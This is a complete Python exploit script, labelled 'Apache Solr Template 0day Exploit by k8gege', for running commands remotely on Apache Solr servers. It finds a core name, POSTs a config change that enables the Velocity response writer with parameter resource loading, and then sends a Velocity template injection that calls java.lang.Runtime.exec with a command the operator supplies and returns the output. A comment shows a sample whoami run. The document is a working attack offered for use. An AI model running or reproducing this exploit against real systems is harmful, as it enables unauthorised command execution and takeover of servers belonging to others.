import requests
import json
import sys
# C:\Users\null\Desktop\Solr0day>python exp.py http://192.168.1.26:8983 whoami
# Apache Solr Template 0day Exploit by k8gege
# Upconfig:  http://192.168.1.26:8983/solr/k8/config
# ExecCmd:      0  win-4udh62v7dmn\null

def getname(url):
    url += "/solr/admin/cores?wt=json&indexInfo=false"
    conn = requests.request("GET", url=url)
    name = "test"
    try:
        name = list(json.loads(conn.text)["status"])[0]
    except:
        pass
    return name


def upconfig(url, name):

    url += "/solr/"+name+"/config"
    print "Upconfig: ", url
    headers = {"Content-Type": "application/json"}
    post_data = """
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    """
    conn = requests.request("POST", url, data=post_data, headers=headers)
    if conn.status_code != 200:
        print "Upconfig error: ", conn.status_code
        sys.exit(1)


def poc(url,cmd):
    core_name = getname(url)
    upconfig(url, core_name)
    url += "/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    conn = requests.request("GET", url)
    print "ExecCmd: "+conn.text


if __name__ == '__main__':
    print "Apache Solr Template 0day Exploit by k8gege"
    url = sys.argv[1]
    cmd = sys.argv[2]
    poc(url,cmd)
